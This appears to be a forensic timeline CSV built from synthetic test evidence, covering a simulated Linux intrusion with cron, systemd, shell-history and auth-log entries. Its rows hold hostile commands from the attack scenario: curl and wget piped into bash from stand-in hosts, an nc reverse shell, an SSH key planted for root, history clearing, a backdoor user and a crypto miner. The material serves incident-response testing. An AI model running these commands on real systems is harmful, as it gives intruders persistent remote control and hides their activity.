2026-04-27T10:55:40+00:00,2026-04-27,10:55:40,cron,cron_entry,root,,cron[root] sched=17 * * * * cmd=cd / && run-parts --report /etc/cron.hourly,"{""schedule"": ""17 * * * *"", ""user"": ""root"", ""command"": ""cd / && run-parts --report /etc/cron.hourly"", ""file"": ""/home/claude/test_evidence/etc/crontab""}",17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
2026-04-27T10:55:40+00:00,2026-04-27,10:55:40,cron,cron_entry,root,,cron[root] sched=25 6 * * * cmd=test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ),"{""schedule"": ""25 6 * * *"", ""user"": ""root"", ""command"": ""test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )"", ""file"": ""/home/claude/test_evidence/etc/crontab""}",25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
2026-04-27T10:55:40+00:00,2026-04-27,10:55:40,cron,cron_entry,root,,cron[root] sched=47 6 * * 7 cmd=test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ),"{""schedule"": ""47 6 * * 7"", ""user"": ""root"", ""command"": ""test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )"", ""file"": ""/home/claude/test_evidence/etc/crontab""}",47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
2026-04-27T10:55:40+00:00,2026-04-27,10:55:40,cron,cron_entry,root,,cron[root] sched=52 6 1 * * cmd=test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ),"{""schedule"": ""52 6 1 * *"", ""user"": ""root"", ""command"": ""test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )"", ""file"": ""/home/claude/test_evidence/etc/crontab""}",52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
2026-04-27T10:55:45+00:00,2026-04-27,10:55:45,cron,cron_entry,alice,,cron[alice] sched=*/30 * * * * cmd=/home/alice/scripts/sync.sh,"{""schedule"": ""*/30 * * * *"", ""user"": ""alice"", ""command"": ""/home/alice/scripts/sync.sh"", ""file"": ""/home/claude/test_evidence/var/spool/cron/crontabs/alice""}",*/30 * * * * /home/alice/scripts/sync.sh
2026-04-27T10:55:45+00:00,2026-04-27,10:55:45,cron,cron_entry,alice,,cron[alice] sched=@reboot cmd=-qO- http://example.com/agent.sh | bash,"{""schedule"": ""@reboot"", ""user"": ""alice"", ""command"": ""-qO- http://example.com/agent.sh | bash"", ""file"": ""/home/claude/test_evidence/var/spool/cron/crontabs/alice""}",@reboot wget -qO- http://example.com/agent.sh | bash
2026-04-27T10:55:48+00:00,2026-04-27,10:55:48,systemd,unit_present,,,systemd unit: sysmaint.service ExecStart=/tmp/.cache/helper --daemon,"{""name"": ""sysmaint.service"", ""path"": ""/home/claude/test_evidence/etc/systemd/system/sysmaint.service"", ""exec_start"": [""/tmp/.cache/helper --daemon""], ""exec_start_pre"": [], ""user"": ""root"", ""type"": ""simple"", ""wantedby"": [""multi-user.target""], ""description"": ""System Maintenance Helper""}",
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: cd /tmp,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",cd /tmp
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: wget http://198.51.100.7/x -O agent,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",wget http://198.51.100.7/x -O agent
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: chmod +x agent,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",chmod +x agent
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: ./agent &,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",./agent &
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: curl -s http://attacker.example/payload.sh | bash,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",curl -s http://attacker.example/payload.sh | bash
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: nc -e /bin/sh 198.51.100.7 4444,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",nc -e /bin/sh 198.51.100.7 4444
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,"claude: echo ""ssh-rsa AAAAB3..."" >> /root/.ssh/authorized_keys","{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}","echo ""ssh-rsa AAAAB3..."" >> /root/.ssh/authorized_keys"
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: crontab -e,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",crontab -e
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: visudo,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",visudo
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: unset HISTFILE,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",unset HISTFILE
2026-04-27T10:55:55+00:00,2026-04-27,10:55:55,.bash_history,shell_command,claude,,claude: history -c,"{""history_file"": ""/home/claude/test_evidence/root/.bash_history""}",history -c
2026-09-12T02:00:00+00:00,2026-09-12,02:00:00,maillog,maillog:postfix/smtpd,,web01,connect from unknown[203.0.113.50],"{""program"": ""postfix/smtpd""}",Sep 12 02:00:00 web01 postfix/smtpd[8000]: connect from unknown[203.0.113.50]
2026-09-12T02:00:01+00:00,2026-09-12,02:00:01,maillog,maillog:postfix/smtpd,,web01,NOQUEUE: reject: RCPT from unknown[203.0.113.50]: 554 5.7.1 Service unavailable,"{""program"": ""postfix/smtpd""}",Sep 12 02:00:01 web01 postfix/smtpd[8000]: NOQUEUE: reject: RCPT from unknown[203.0.113.50]: 554 5.7.1 Service unavailable
2026-09-12T02:00:02+00:00,2026-09-12,02:00:02,maillog,maillog:postfix/smtpd,,web01,disconnect from unknown[203.0.113.50],"{""program"": ""postfix/smtpd""}",Sep 12 02:00:02 web01 postfix/smtpd[8000]: disconnect from unknown[203.0.113.50]
2026-09-12T02:30:00+00:00,2026-09-12,02:30:00,syslog,syslog:systemd,,web01,Started Daily apt download activities.,"{""program"": ""systemd""}",Sep 12 02:30:00 web01 systemd[1]: Started Daily apt download activities.
2026-09-12T02:30:01+00:00,2026-09-12,02:30:01,syslog,syslog:systemd,,web01,apt-daily.service: Succeeded.,"{""program"": ""systemd""}",Sep 12 02:30:01 web01 systemd[1]: apt-daily.service: Succeeded.
2026-09-12T03:00:00+00:00,2026-09-12,03:00:00,syslog,syslog:CRON,,web01,(root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )),"{""program"": ""CRON""}",Sep 12 03:00:00 web01 CRON[3001]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
2026-09-12T03:00:01+00:00,2026-09-12,03:00:01,cron,cron:CROND,,web01,(root) CMD (run-parts /etc/cron.hourly),"{""program"": ""CROND""}",Sep 12 03:00:01 web01 CROND[1000]: (root) CMD (run-parts /etc/cron.hourly)
2026-09-12T03:00:01+00:00,2026-09-12,03:00:01,cron,cron:anacron,,web01,Job `cron.daily' started,"{""program"": ""anacron""}",Sep 12 03:00:01 web01 anacron[1001]: Job `cron.daily' started
2026-09-12T03:00:30+00:00,2026-09-12,03:00:30,cron,cron:anacron,,web01,Job `cron.daily' terminated,"{""program"": ""anacron""}",Sep 12 03:00:30 web01 anacron[1001]: Job `cron.daily' terminated
2026-09-12T03:14:01+00:00,2026-09-12,03:14:01,messages,messages:systemd,,web01,Started Session 5 of user alice.,"{""program"": ""systemd""}",Sep 12 03:14:01 web01 systemd[1]: Started Session 5 of user alice.
2026-09-12T03:14:01+00:00,2026-09-12,03:14:01,syslog,syslog:systemd,,web01,Starting Cleanup of Temporary Directories...,"{""program"": ""systemd""}",Sep 12 03:14:01 web01 systemd[1]: Starting Cleanup of Temporary Directories...
2026-09-12T03:14:02+00:00,2026-09-12,03:14:02,messages,messages:kernel,,web01,usb 1-1: new high-speed USB device number 4 using xhci_hcd,"{""program"": ""kernel""}",Sep 12 03:14:02 web01 kernel: usb 1-1: new high-speed USB device number 4 using xhci_hcd
2026-09-12T03:14:02+00:00,2026-09-12,03:14:02,messages,messages:kernel,,web01,usb-storage 1-1:1.0: USB Mass Storage device detected,"{""program"": ""kernel""}",Sep 12 03:14:02 web01 kernel: usb-storage 1-1:1.0: USB Mass Storage device detected
2026-09-12T03:14:02+00:00,2026-09-12,03:14:02,kern.log,kern.log:kernel,,web01,[    0.000000] Linux version 5.15.0-91-generic,"{""program"": ""kernel""}",Sep 12 03:14:02 web01 kernel: [    0.000000] Linux version 5.15.0-91-generic
2026-09-12T03:14:02+00:00,2026-09-12,03:14:02,kern.log,kern.log:kernel,,web01,[    1.234567] usb 1-1: new high-speed USB device number 4 using xhci_hcd,"{""program"": ""kernel""}",Sep 12 03:14:02 web01 kernel: [    1.234567] usb 1-1: new high-speed USB device number 4 using xhci_hcd
2026-09-12T03:14:02+00:00,2026-09-12,03:14:02,kern.log,kern.log:kernel,,web01,[    1.345678] usb-storage 1-1:1.0: USB Mass Storage device detected,"{""program"": ""kernel""}",Sep 12 03:14:02 web01 kernel: [    1.345678] usb-storage 1-1:1.0: USB Mass Storage device detected
2026-09-12T03:20:11+00:00,2026-09-12,03:20:11,messages,messages:kernel,,web01,Out of memory: Killed process 12345 (xmrig) total-vm:2097152kB,"{""program"": ""kernel""}",Sep 12 03:20:11 web01 kernel: Out of memory: Killed process 12345 (xmrig) total-vm:2097152kB
2026-09-12T03:20:11+00:00,2026-09-12,03:20:11,kern.log,kern.log:kernel,,web01,[ 4567.890] Out of memory: Killed process 12345 (xmrig),"{""program"": ""kernel""}",Sep 12 03:20:11 web01 kernel: [ 4567.890] Out of memory: Killed process 12345 (xmrig)
2026-09-12T03:20:12+00:00,2026-09-12,03:20:12,messages,messages:kernel,,web01,oom-killer: gfp_mask=0x100cca(GFP_HIGHUSER_MOVABLE),"{""program"": ""kernel""}",Sep 12 03:20:12 web01 kernel: oom-killer: gfp_mask=0x100cca(GFP_HIGHUSER_MOVABLE)
2026-09-12T04:00:00+00:00,2026-09-12,04:00:00,kern.log,kern.log:kernel,,web01,"[ 5000.000] audit: type=1400 audit(1726113600.000:300): avc:  denied  { execute } for  pid=999 comm=""bash""","{""program"": ""kernel""}","Sep 12 04:00:00 web01 kernel: [ 5000.000] audit: type=1400 audit(1726113600.000:300): avc:  denied  { execute } for  pid=999 comm=""bash"""
2026-09-12T04:00:01+00:00,2026-09-12,04:00:01,messages,messages:sshd,,web01,Accepted publickey for alice from 192.0.2.10 port 50000 ssh2,"{""program"": ""sshd""}",Sep 12 04:00:01 web01 sshd[8001]: Accepted publickey for alice from 192.0.2.10 port 50000 ssh2
2026-09-12T04:22:11+00:00,2026-09-12,04:22:11,auth.log,ssh_login_failed,admin,,SSH login failed: user=admin ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:11 web01 sshd[20001]: Failed password for invalid user admin from 192.0.2.55 port 33001 ssh2
2026-09-12T04:22:13+00:00,2026-09-12,04:22:13,auth.log,ssh_login_failed,admin,,SSH login failed: user=admin ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:13 web01 sshd[20002]: Failed password for invalid user admin from 192.0.2.55 port 33002 ssh2
2026-09-12T04:22:15+00:00,2026-09-12,04:22:15,auth.log,ssh_login_failed,admin,,SSH login failed: user=admin ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:15 web01 sshd[20003]: Failed password for invalid user admin from 192.0.2.55 port 33003 ssh2
2026-09-12T04:22:17+00:00,2026-09-12,04:22:17,auth.log,ssh_login_failed,root,,SSH login failed: user=root ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:17 web01 sshd[20004]: Failed password for invalid user root from 192.0.2.55 port 33004 ssh2
2026-09-12T04:22:19+00:00,2026-09-12,04:22:19,auth.log,ssh_login_failed,root,,SSH login failed: user=root ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:19 web01 sshd[20005]: Failed password for invalid user root from 192.0.2.55 port 33005 ssh2
2026-09-12T04:22:21+00:00,2026-09-12,04:22:21,auth.log,ssh_login_failed,oracle,,SSH login failed: user=oracle ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:21 web01 sshd[20006]: Failed password for invalid user oracle from 192.0.2.55 port 33006 ssh2
2026-09-12T04:22:23+00:00,2026-09-12,04:22:23,auth.log,ssh_login_failed,oracle,,SSH login failed: user=oracle ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:23 web01 sshd[20007]: Failed password for invalid user oracle from 192.0.2.55 port 33007 ssh2
2026-09-12T04:22:25+00:00,2026-09-12,04:22:25,auth.log,ssh_login_failed,postgres,,SSH login failed: user=postgres ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:25 web01 sshd[20008]: Failed password for invalid user postgres from 192.0.2.55 port 33008 ssh2
2026-09-12T04:22:27+00:00,2026-09-12,04:22:27,auth.log,ssh_login_failed,postgres,,SSH login failed: user=postgres ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:27 web01 sshd[20009]: Failed password for invalid user postgres from 192.0.2.55 port 33009 ssh2
2026-09-12T04:22:29+00:00,2026-09-12,04:22:29,auth.log,ssh_login_failed,test,,SSH login failed: user=test ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:29 web01 sshd[20010]: Failed password for invalid user test from 192.0.2.55 port 33010 ssh2
2026-09-12T04:22:31+00:00,2026-09-12,04:22:31,auth.log,ssh_login_failed,user,,SSH login failed: user=user ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:31 web01 sshd[20011]: Failed password for invalid user user from 192.0.2.55 port 33011 ssh2
2026-09-12T04:22:33+00:00,2026-09-12,04:22:33,auth.log,ssh_login_failed,pi,,SSH login failed: user=pi ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:33 web01 sshd[20012]: Failed password for invalid user pi from 192.0.2.55 port 33012 ssh2
2026-09-12T04:22:35+00:00,2026-09-12,04:22:35,auth.log,ssh_login_failed,nginx,,SSH login failed: user=nginx ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:35 web01 sshd[20013]: Failed password for invalid user nginx from 192.0.2.55 port 33013 ssh2
2026-09-12T04:22:37+00:00,2026-09-12,04:22:37,auth.log,ssh_login_failed,mysql,,SSH login failed: user=mysql ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:37 web01 sshd[20014]: Failed password for invalid user mysql from 192.0.2.55 port 33014 ssh2
2026-09-12T04:22:39+00:00,2026-09-12,04:22:39,auth.log,ssh_login_failed,git,,SSH login failed: user=git ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:39 web01 sshd[20015]: Failed password for invalid user git from 192.0.2.55 port 33015 ssh2
2026-09-12T04:22:41+00:00,2026-09-12,04:22:41,auth.log,ssh_login_failed,ftp,,SSH login failed: user=ftp ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:41 web01 sshd[20016]: Failed password for invalid user ftp from 192.0.2.55 port 33016 ssh2
2026-09-12T04:22:43+00:00,2026-09-12,04:22:43,auth.log,ssh_login_failed,backup,,SSH login failed: user=backup ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:43 web01 sshd[20017]: Failed password for invalid user backup from 192.0.2.55 port 33017 ssh2
2026-09-12T04:22:45+00:00,2026-09-12,04:22:45,auth.log,ssh_login_failed,info,,SSH login failed: user=info ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:45 web01 sshd[20018]: Failed password for invalid user info from 192.0.2.55 port 33018 ssh2
2026-09-12T04:22:47+00:00,2026-09-12,04:22:47,auth.log,ssh_login_failed,mail,,SSH login failed: user=mail ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:47 web01 sshd[20019]: Failed password for invalid user mail from 192.0.2.55 port 33019 ssh2
2026-09-12T04:22:49+00:00,2026-09-12,04:22:49,auth.log,ssh_login_failed,testing,,SSH login failed: user=testing ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:49 web01 sshd[20020]: Failed password for invalid user testing from 192.0.2.55 port 33020 ssh2
2026-09-12T04:22:51+00:00,2026-09-12,04:22:51,auth.log,ssh_login_failed,demo,,SSH login failed: user=demo ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:51 web01 sshd[20021]: Failed password for invalid user demo from 192.0.2.55 port 33021 ssh2
2026-09-12T04:22:53+00:00,2026-09-12,04:22:53,auth.log,ssh_login_failed,guest,,SSH login failed: user=guest ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:53 web01 sshd[20022]: Failed password for invalid user guest from 192.0.2.55 port 33022 ssh2
2026-09-12T04:22:55+00:00,2026-09-12,04:22:55,auth.log,ssh_login_failed,developer,,SSH login failed: user=developer ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:55 web01 sshd[20023]: Failed password for invalid user developer from 192.0.2.55 port 33023 ssh2
2026-09-12T04:22:57+00:00,2026-09-12,04:22:57,auth.log,ssh_login_failed,deploy,,SSH login failed: user=deploy ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:57 web01 sshd[20024]: Failed password for invalid user deploy from 192.0.2.55 port 33024 ssh2
2026-09-12T04:22:59+00:00,2026-09-12,04:22:59,auth.log,ssh_login_failed,www,,SSH login failed: user=www ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:22:59 web01 sshd[20025]: Failed password for invalid user www from 192.0.2.55 port 33025 ssh2
2026-09-12T04:23:01+00:00,2026-09-12,04:23:01,auth.log,ssh_login_failed,docker,,SSH login failed: user=docker ip=192.0.2.55,"{""ip"": ""192.0.2.55"", ""method"": ""password""}",Sep 12 04:23:01 web01 sshd[20026]: Failed password for invalid user docker from 192.0.2.55 port 33026 ssh2
2026-09-12T04:23:30+00:00,2026-09-12,04:23:30,auth.log,ssh_login_success,alice,,SSH login success: user=alice ip=192.0.2.55 method=password,"{""ip"": ""192.0.2.55"", ""method"": ""password"", ""port"": ""33099""}",Sep 12 04:23:30 web01 sshd[20100]: Accepted password for alice from 192.0.2.55 port 33099 ssh2
2026-09-12T04:24:15+00:00,2026-09-12,04:24:15,auth.log,sudo_command,alice,,sudo: alice -> root: /bin/bash,"{""target"": ""root"", ""command"": ""/bin/bash"", ""tty"": ""pts/0"", ""pwd"": ""/home/alice""}",Sep 12 04:24:15 web01 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash
2026-09-12T04:25:01+00:00,2026-09-12,04:25:01,auth.log,user_added,svc_backup,,User added: svc_backup,,"Sep 12 04:25:01 web01 useradd[21001]: new user: name=svc_backup, UID=998, GID=998, home=/home/svc_backup, shell=/bin/bash"
2026-09-12T04:25:30+00:00,2026-09-12,04:25:30,auth.log,user_modified,,,usermod: change user 'svc_backup' GID to '27',,Sep 12 04:25:30 web01 usermod[21010]: change user 'svc_backup' GID to '27'
2026-09-12T04:30:01+00:00,2026-09-12,04:30:01,syslog,syslog:systemd,,web01,apt-daily-upgrade.service: Succeeded.,"{""program"": ""systemd""}",Sep 12 04:30:01 web01 systemd[1]: apt-daily-upgrade.service: Succeeded.
2026-09-12T04:30:01+00:00,2026-09-12,04:30:01,cron,cron:CROND,,web01,(root) CMD (curl -s http://198.51.100.7/x.sh | bash),"{""program"": ""CROND""}",Sep 12 04:30:01 web01 CROND[2000]: (root) CMD (curl -s http://198.51.100.7/x.sh | bash)
2026-09-12T04:30:11+00:00,2026-09-12,04:30:11,messages,messages:nginx,,web01,"198.51.100.55 - - [12/Sep/2025:04:30:11 +0000] ""GET /admin HTTP/1.1"" 404 162","{""program"": ""nginx""}","Sep 12 04:30:11 web01 nginx[9001]: 198.51.100.55 - - [12/Sep/2025:04:30:11 +0000] ""GET /admin HTTP/1.1"" 404 162"
2026-09-12T04:45:00+00:00,2026-09-12,04:45:00,messages,messages:kernel,,web01,nginx[10000]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4,"{""program"": ""kernel""}",Sep 12 04:45:00 web01 kernel: nginx[10000]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4
2026-09-12T04:45:30+00:00,2026-09-12,04:45:30,messages,messages:kernel,,web01,nginx[10001]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4,"{""program"": ""kernel""}",Sep 12 04:45:30 web01 kernel: nginx[10001]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4
2026-09-12T04:45:55+00:00,2026-09-12,04:45:55,messages,messages:kernel,,web01,nginx[10002]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4,"{""program"": ""kernel""}",Sep 12 04:45:55 web01 kernel: nginx[10002]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4
2026-09-12T04:46:10+00:00,2026-09-12,04:46:10,messages,messages:kernel,,web01,nginx[10003]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4,"{""program"": ""kernel""}",Sep 12 04:46:10 web01 kernel: nginx[10003]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4
2026-09-12T04:46:30+00:00,2026-09-12,04:46:30,messages,messages:kernel,,web01,nginx[10004]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4,"{""program"": ""kernel""}",Sep 12 04:46:30 web01 kernel: nginx[10004]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4
2026-09-12T04:46:55+00:00,2026-09-12,04:46:55,messages,messages:kernel,,web01,nginx[10005]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4,"{""program"": ""kernel""}",Sep 12 04:46:55 web01 kernel: nginx[10005]: segfault at 0 ip 00007f1234 sp 00007fff5678 error 4
2026-09-12T05:00:01+00:00,2026-09-12,05:00:01,messages,messages:systemd,,web01,Reloading.,"{""program"": ""systemd""}",Sep 12 05:00:01 web01 systemd[1]: Reloading.
2026-09-12T05:01:00+00:00,2026-09-12,05:01:00,auth.log,ssh_login_success,root,,SSH login success: user=root ip=198.51.100.99 method=publickey,"{""ip"": ""198.51.100.99"", ""method"": ""publickey"", ""port"": ""51000""}",Sep 12 05:01:00 web01 sshd[22000]: Accepted publickey for root from 198.51.100.99 port 51000 ssh2: RSA SHA256:XXXXXX
2026-09-12T05:01:00+00:00,2026-09-12,05:01:00,messages,messages:kernel,,web01,"audit: type=1400 audit(1726113660.123:201): apparmor=""DENIED"" operation=""open"" profile=""/usr/sbin/nginx""","{""program"": ""kernel""}","Sep 12 05:01:00 web01 kernel: audit: type=1400 audit(1726113660.123:201): apparmor=""DENIED"" operation=""open"" profile=""/usr/sbin/nginx"""
2026-09-12T05:30:00+00:00,2026-09-12,05:30:00,messages,messages:cron,,web01,(root) CMD (curl -fsSL http://198.51.100.7/c.sh | bash),"{""program"": ""cron""}",Sep 12 05:30:00 web01 cron[2222]: (root) CMD (curl -fsSL http://198.51.100.7/c.sh | bash)
2026-09-12T05:30:10+00:00,2026-09-12,05:30:10,auth.log,password_changed,bob,,Password changed for bob,,Sep 12 05:30:10 web01 passwd[23000]: pam_unix(passwd:chauthtok): password changed for bob
2026-09-12T06:25:01+00:00,2026-09-12,06:25:01,syslog,syslog:CRON,,web01,(root) CMD (/tmp/.x/agent.sh),"{""program"": ""CRON""}",Sep 12 06:25:01 web01 CRON[5000]: (root) CMD (/tmp/.x/agent.sh)
